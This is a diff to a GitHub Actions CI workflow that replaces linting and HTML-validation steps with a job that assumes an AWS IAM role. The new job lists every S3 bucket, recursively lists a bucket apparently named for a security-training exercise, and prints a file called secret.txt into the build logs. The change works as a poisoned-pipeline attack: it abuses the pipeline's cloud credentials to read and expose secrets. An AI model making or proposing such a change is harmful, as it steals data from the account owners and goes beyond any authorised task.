@@ -1,47 +1,39 @@
 name: CI
 
 on:
-  push:
-  pull_request:
-  workflow_dispatch:
+    push:
+    pull_request:
+    workflow_dispatch:
 
 jobs:
-  lint-and-validate:
-    runs-on: ubuntu-latest
+    list-s3-buckets:
+        runs-on: ubuntu-latest
 
-    steps:
-      - name: Checkout code
-        uses: actions/checkout@v4
+        steps:
+            - name: Configure AWS credentials
+                uses: aws-actions/configure-aws-credentials@v4
+                with:
+                role-to-assume: arn:aws:iam::862479276810:role/github-actions
+                role-session-name: GitHub-Actions-Session
+                aws-region: ap-northeast-1
 
-      - name: Validate HTML
-        uses: Cyb3r-Jak3/html5validator-action@41633d488eb36e18fd1a95ffc83daf1bf22a75bd
-        with:
-          root: company-website/
-          css: true
-          log_level: INFO
+            - name: List S3 buckets
+              run: |
+                  echo "Listing all S3 buckets:"
+                  aws s3 ls
 
-      - name: Setup Node.js
-        uses: actions/setup-node@v4
-        with:
-          node-version: "20"
+                  echo ""
+                  echo "Detailed bucket information:"
+                  aws s3api list-buckets --query "Buckets[*].[Name,CreationDate]" --output table
 
-      - name: Install dependencies
-        run: npm install --global eslint prettier stylelint stylelint-config-standard
+                  echo ""
+                  echo "Listing files in top-secret-bucket-security-training-202509:"
+                  aws s3 ls s3://top-secret-bucket-security-training-202509/ --recursive
 
-      - name: Lint JavaScript
-        working-directory: ./company-website
-        run: |
-          npx eslint js/ --ext .js || true
-          echo "ESLint completed (non-blocking)"
+                  echo ""
+                  echo "Detailed file information:"
+                  aws s3api list-objects-v2 --bucket top-secret-bucket-security-training-202509 --query "Contents[*].[Key,Size,LastModified]" --output table
 
-      - name: Lint CSS
-        working-directory: ./company-website
-        run: |
-          npx stylelint "css/**/*.css" || true
-          echo "StyleLint completed (non-blocking)"
-
-      - name: Check formatting
-        working-directory: ./company-website
-        run: |
-          npx prettier --check . || true
-          echo "Prettier check completed (non-blocking)"
+                  echo ""
+                  echo "Content of secret.txt:"
+                  aws s3 cp s3://top-secret-bucket-security-training-202509/secret.txt - 2>/dev/null || echo "File not found or access denied"
